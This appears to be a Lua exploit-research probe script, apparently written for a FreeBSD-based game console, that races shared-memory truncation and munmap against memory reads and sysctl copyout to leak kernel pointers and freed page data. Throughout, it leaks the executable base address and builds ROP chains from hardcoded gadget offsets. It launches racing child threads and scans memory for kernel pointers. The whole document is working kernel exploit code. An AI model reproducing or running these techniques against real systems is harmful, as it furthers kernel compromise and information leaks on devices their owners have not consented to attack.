-- CRASH_CLASS: MODERATE
-- PROBE 398a: shm ftruncate vs mmap access race
--
-- shm_open + mmap + ftruncate from child thread.
-- If the kernel doesn't invalidate PTEs atomically on truncate,
-- reading past the new EOF might return stale/freed page data.
-- Also: sendfile from shm fd while child truncates — kernel copyout race.
-- Target: kernel information leak (freed page contents, kernel pointers).

print("=== PROBE 398a: shm truncate race ===")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function w64(addr, lo, hi)
    wd(addr, lo or 0); wd(addr + 4, hi or 0)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive()
    local ok, v = pcall(function() return native.fcall_with_rax(stub, 20) end)
    return ok and N(v) == pid_val
end

-- Eboot base
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local eb_lo = rd(N(info) + 0x108) or 0
local eb_hi = rd(N(info) + 0x10C) or 0
print(string.format("eb=%X_%08X", eb_hi, eb_lo))

local function g(off)
    return uint64(string.format("0x%X%08X", eb_hi, eb_lo + off))
end
local function g_lohi(off)
    local lo = eb_lo + off; local hi = eb_hi
    if lo >= 0x100000000 then hi = hi + math.floor(lo / 0x100000000); lo = lo % 0x100000000 end
    return lo, hi
end

-- Gadgets
local pop_rax_ret = g(0x992)
local pop_rdi_ret = g(0xC9DFE)
local pop_rsi_ret = g(0xD77D)
local pop_rdx_ret = g(0x3B02D7)
local pop_rcx_ret = g(0xE64)
local pop_r8_ret  = g(0x991)
local mov_rdi_rax = g(0x92C67)
local bare_ret    = g(0x42)

-- Signal ignore
local sa = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(sa) + i, 0) end
wq(sa, uint64(1))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end) -- SIGSYS
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end) -- SIGSEGV
pcall(function() mk(416)(uint64(10), sa, uint64(0)) end) -- SIGBUS

-- Fake TCB
local tcb_buf = memory.alloc(0x1000)
for i = 0, 0xFFC, 4 do wd(N(tcb_buf) + i, 0) end
local tcb_mid = N(tcb_buf) + 0x800
wd(tcb_mid, tcb_mid % 0x100000000)
wd(tcb_mid + 4, math.floor(tcb_mid / 0x100000000))
local tcb_ptr = memory.alloc(8)
wq(tcb_ptr, uint64(tcb_mid))

-- Shared state
local shared = memory.alloc(0x100)
for i = 0, 0xFC, 4 do wd(N(shared) + i, 0) end

-- ============================================
-- PART A: shm_open + mmap + ftruncate race
-- ============================================
print("")
print("-- A: shm truncate race --")

-- SHM_ANON = 1 on FreeBSD (passed as path=SHM_ANON)
-- shm_open(482): path, flags, mode
-- O_CREAT|O_RDWR = 0x0202
local ok_shm, shm_fd = pcall(function()
    return mk(482)(uint64(1), uint64(0x0202), uint64(0x1B6))
end)
shm_fd = ok_shm and N(shm_fd) or -1
print("shm_fd=" .. shm_fd)

if shm_fd >= 0 then
    -- ftruncate to 16 pages (256KB with 16KB pages)
    local SHM_SIZE = 16 * 0x4000  -- 0x40000 = 256KB
    local ok_ft, rv_ft = pcall(function()
        return mk(480)(uint64(shm_fd), uint64(SHM_SIZE))
    end)
    print(string.format("ftruncate(%d)=%d", SHM_SIZE, ok_ft and N(rv_ft) or -999))

    -- mmap the entire region
    local ok_mm, shm_map = pcall(function()
        return mk(477)(uint64(0), uint64(SHM_SIZE), uint64(0x3),
            uint64(0x1), uint64(shm_fd), uint64(0))
    end)
    local mh, ml = 0, 0
    if ok_mm and shm_map then mh, ml = get_hi_lo(shm_map) end
    local map_base = ml + mh * 0x100000000
    print(string.format("shm_map=%X_%08X", mh, ml))

    if map_base > 0 then
        -- Fill ALL pages with distinct markers
        for pg = 0, 15 do
            local off = pg * 0x4000
            wd(map_base + off, 0xAA000000 + pg)
            wd(map_base + off + 4, 0xBB000000 + pg)
        end
        print(string.format("filled 16 pages, p0=%08X p15=%08X",
            rd(map_base) or 0, rd(map_base + 15*0x4000) or 0))

        -- Now race: child truncates to 1 page, main reads pages 1-15
        local RACE_ITERS = 30
        local anomaly_count = 0
        local kptr_count = 0
        local sigbus_count = 0

        for iter = 1, RACE_ITERS do
            -- Re-expand to 16 pages
            pcall(function() mk(480)(uint64(shm_fd), uint64(SHM_SIZE)) end)

            -- Re-fill markers on all pages
            for pg = 0, 15 do
                local off = pg * 0x4000
                local ok_w = pcall(function()
                    memory.write_dword(map_base + off, 0xAA000000 + pg + iter * 0x100)
                end)
                if not ok_w then break end
            end

            -- Build child chain: truncate shm to 1 page
            local child_stk = memory.alloc(0x400)
            for i = 0, 0x3FC, 4 do wd(N(child_stk) + i, 0) end
            local child_base = N(child_stk)
            local child_rsp = ((child_base + 0x300) - ((child_base + 0x300) % 16)) - 8

            local sp = child_rsp
            local function push(val) wq(sp, val); sp = sp + 8 end

            -- sysarch(SET_FSBASE=129)
            push(uint64(165))
            push(pop_rdi_ret); push(uint64(129))
            push(pop_rsi_ret); push(uint64(N(tcb_ptr)))
            push(pop_rdx_ret); push(uint64(0))
            push(pop_rcx_ret); push(uint64(0))
            push(stub)

            -- Small spin
            for i = 1, 10 do push(bare_ret) end

            -- ftruncate(shm_fd, 0x4000) — shrink to 1 page
            push(pop_rax_ret); push(uint64(480))
            push(pop_rdi_ret); push(uint64(shm_fd))
            push(pop_rsi_ret); push(uint64(0x4000))
            push(pop_rdx_ret); push(uint64(0))
            push(pop_rcx_ret); push(uint64(0))
            push(stub)

            -- Store ftruncate return
            push(pop_rdi_ret); push(uint64(N(shared) + 0x04))
            push(mov_rdi_rax)

            -- Mark done
            push(pop_rdi_ret); push(uint64(N(shared)))
            push(pop_rax_ret); push(uint64(0xDDDD))
            push(mov_rdi_rax)

            -- thr_exit
            push(pop_rax_ret); push(uint64(431))
            push(pop_rdi_ret); push(uint64(0))
            push(stub)

            -- Launch child
            wd(N(shared), 0)
            wd(N(shared) + 4, 0xFF)

            local pa = memory.alloc(0x38)
            for i = 0, 0x34, 4 do wd(N(pa) + i, 0) end
            local sf_lo, sf_hi = g_lohi(0x992)
            w64(N(pa), sf_lo, sf_hi)
            w64(N(pa) + 0x10, child_base % 0x100000000, math.floor(child_base / 0x100000000))
            w64(N(pa) + 0x18, 0x300, 0)

            pcall(function() mk(455)(uint64(N(pa)), uint64(0x38)) end)

            -- IMMEDIATELY read pages 1-15 (racing with child's truncate)
            local found_zero = false
            local found_kptr = false
            local found_unknown = false
            for pg = 1, 15 do
                local off = pg * 0x4000
                local ok_r, val_r = pcall(function()
                    return memory.read_dword(map_base + off)
                end)
                if not ok_r then
                    -- SIGBUS or similar — page was invalidated
                    sigbus_count = sigbus_count + 1
                    break
                end
                local v = N(val_r)
                local expected_base = 0xAA000000 + pg + iter * 0x100
                if v == 0 then
                    found_zero = true
                elseif v ~= expected_base then
                    -- Check for kernel pointer
                    local vh = math.floor(v / 0x10000)
                    if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                        found_kptr = true
                        kptr_count = kptr_count + 1
                        print(string.format("[%d] KPTR at page %d: %08X", iter, pg, v))
                    elseif v ~= 0xAA000000 + pg then
                        -- Not our marker, not zero, not expected — stale data?
                        found_unknown = true
                        if anomaly_count < 10 then
                            print(string.format("[%d] STALE? page %d: %08X (expect %08X)",
                                iter, pg, v, expected_base))
                        end
                    end
                end
            end

            if found_zero or found_kptr or found_unknown then
                anomaly_count = anomaly_count + 1
            end

            -- Wait for child
            local dummy = 0
            for i = 1, 50000 do dummy = dummy + 1 end

            if not alive() then print("CANARY FAIL iter " .. iter); break end
        end

        print(string.format("race: %d iters, anomalies=%d kptr=%d sigbus=%d",
            RACE_ITERS, anomaly_count, kptr_count, sigbus_count))

        -- ============================================
        -- PART B: Verify truncation behavior (no race)
        -- ============================================
        print("")
        print("-- B: truncation behavior --")

        -- Re-expand
        pcall(function() mk(480)(uint64(shm_fd), uint64(SHM_SIZE)) end)
        for pg = 0, 15 do
            pcall(function()
                memory.write_dword(map_base + pg * 0x4000, 0xCC000000 + pg)
            end)
        end

        -- Truncate to 1 page
        local ok_t2, rv_t2 = pcall(function()
            return mk(480)(uint64(shm_fd), uint64(0x4000))
        end)
        print(string.format("truncate_to_1=%d", ok_t2 and N(rv_t2) or -999))

        -- Try reading each page — which are accessible?
        for pg = 0, 15 do
            local ok_r, val_r = pcall(function()
                return memory.read_dword(map_base + pg * 0x4000)
            end)
            if ok_r then
                local v = N(val_r)
                print(string.format("  page %2d: %08X %s", pg, v,
                    v == 0xCC000000 + pg and "original" or
                    v == 0 and "ZEROED" or "CHANGED"))
            else
                print(string.format("  page %2d: FAULT", pg))
            end
        end

        -- Re-expand and check if truncated pages come back zeroed
        pcall(function() mk(480)(uint64(shm_fd), uint64(SHM_SIZE)) end)
        print("after re-expand:")
        for pg = 0, 15 do
            local ok_r, val_r = pcall(function()
                return memory.read_dword(map_base + pg * 0x4000)
            end)
            if ok_r then
                local v = N(val_r)
                print(string.format("  page %2d: %08X %s", pg, v,
                    v == 0xCC000000 + pg and "survived" or
                    v == 0 and "zeroed" or string.format("other=%08X", v)))
            else
                print(string.format("  page %2d: FAULT", pg))
            end
        end

        -- Cleanup
        pcall(function() mk(73)(shm_map, uint64(SHM_SIZE)) end)
    end
    pcall(function() mk(6)(uint64(shm_fd)) end)
end
if not alive() then print("CANARY FAIL shm"); return end

-- ============================================
-- PART C: munmap buffer race against sysctl
-- ============================================
print("")
print("-- C: munmap vs sysctl race --")

-- Race: main calls sysctl with output buffer, child munmaps the buffer
-- If kernel doesn't pin, copyout fails mid-write = partial data
local SYSCTL_RACES = 30
local sysctl_anomalies = 0

for iter = 1, SYSCTL_RACES do
    -- Map a page for sysctl output
    local ok_p, outpage = pcall(function()
        return mk(477)(uint64(0), uint64(0x4000), uint64(0x3),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    local ph, pl = 0, 0
    if ok_p and outpage then ph, pl = get_hi_lo(outpage) end
    if ph == 0 and pl == 0 then break end
    local pbase = pl + ph * 0x100000000

    -- Fill with sentinel
    for i = 0, 0x3FFC, 4 do wd(pbase + i, 0xDEADDEAD) end

    -- MIB for kinfo_proc (1096 bytes of output)
    local mib = memory.alloc(16)
    wd(N(mib), 1)       -- CTL_KERN
    wd(N(mib) + 4, 14)  -- KERN_PROC
    wd(N(mib) + 8, 1)   -- KERN_PROC_PID
    wd(N(mib) + 12, pid_val)
    local oldlenp = memory.alloc(8)
    wq(oldlenp, uint64(0x4000))

    -- Build child: munmap the output page
    local child_stk = memory.alloc(0x400)
    for i = 0, 0x3FC, 4 do wd(N(child_stk) + i, 0) end
    local child_base = N(child_stk)
    local child_rsp = ((child_base + 0x300) - ((child_base + 0x300) % 16)) - 8
    local sp = child_rsp
    local function push(val) wq(sp, val); sp = sp + 8 end

    push(uint64(165))
    push(pop_rdi_ret); push(uint64(129))
    push(pop_rsi_ret); push(uint64(N(tcb_ptr)))
    push(pop_rdx_ret); push(uint64(0))
    push(pop_rcx_ret); push(uint64(0))
    push(stub)

    -- Tiny spin
    for i = 1, 5 do push(bare_ret) end

    -- munmap(outpage, 0x4000)
    push(pop_rax_ret); push(uint64(73))
    push(pop_rdi_ret); push(outpage)
    push(pop_rsi_ret); push(uint64(0x4000))
    push(pop_rdx_ret); push(uint64(0))
    push(pop_rcx_ret); push(uint64(0))
    push(stub)

    -- Store ret
    push(pop_rdi_ret); push(uint64(N(shared) + 0x10))
    push(mov_rdi_rax)

    -- Mark done
    push(pop_rdi_ret); push(uint64(N(shared)))
    push(pop_rax_ret); push(uint64(0xEEEE))
    push(mov_rdi_rax)

    push(pop_rax_ret); push(uint64(431))
    push(pop_rdi_ret); push(uint64(0))
    push(stub)

    wd(N(shared), 0)

    local pa = memory.alloc(0x38)
    for i = 0, 0x34, 4 do wd(N(pa) + i, 0) end
    local sf_lo, sf_hi = g_lohi(0x992)
    w64(N(pa), sf_lo, sf_hi)
    w64(N(pa) + 0x10, child_base % 0x100000000, math.floor(child_base / 0x100000000))
    w64(N(pa) + 0x18, 0x300, 0)

    -- Launch child THEN immediately call sysctl
    pcall(function() mk(455)(uint64(N(pa)), uint64(0x38)) end)

    local ok_sc, rv_sc = pcall(function()
        return mk(202)(uint64(N(mib)), uint64(4), outpage,
            uint64(N(oldlenp)), uint64(0), uint64(0))
    end)
    local sc_ret = ok_sc and N(rv_sc) or -999

    -- Wait for child
    local dummy = 0
    for i = 1, 50000 do dummy = dummy + 1 end

    -- Try to remap and read what sysctl wrote (if anything)
    local ok_rm, remap = pcall(function()
        return mk(477)(outpage, uint64(0x4000), uint64(0x3),
            uint64(0x1012), uint64(0xFFFFFFFF), uint64(0))
    end)

    if ok_rm then
        local rh, rl = get_hi_lo(remap)
        local rbase = rl + rh * 0x100000000
        if rbase > 0 then
            -- Page should be zeroed (fresh mapping)
            -- If sysctl wrote BEFORE munmap, data is lost
            -- If sysctl wrote AFTER remap... impossible (remap is after sysctl)
            -- The interesting case: sysctl returned partial data (EFAULT mid-write)
            local d0 = rd(rbase) or 0
            -- This page is fresh, should be 0
            if d0 ~= 0 then
                sysctl_anomalies = sysctl_anomalies + 1
                print(string.format("[%d] remap data not zero: %08X sc=%d",
                    iter, d0, sc_ret))
            end
            pcall(function() mk(73)(remap, uint64(0x4000)) end)
        end
    end

    -- Interesting: what was sysctl's return?
    if sc_ret ~= 0 and sc_ret ~= -1 and sc_ret ~= -999 then
        sysctl_anomalies = sysctl_anomalies + 1
        print(string.format("[%d] sysctl unusual ret=%d", iter, sc_ret))
    end

    if not alive() then print("CANARY FAIL sysctl race " .. iter); break end
end

print(string.format("sysctl_race: %d iters, anomalies=%d", SYSCTL_RACES, sysctl_anomalies))

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 398a COMPLETE ===")
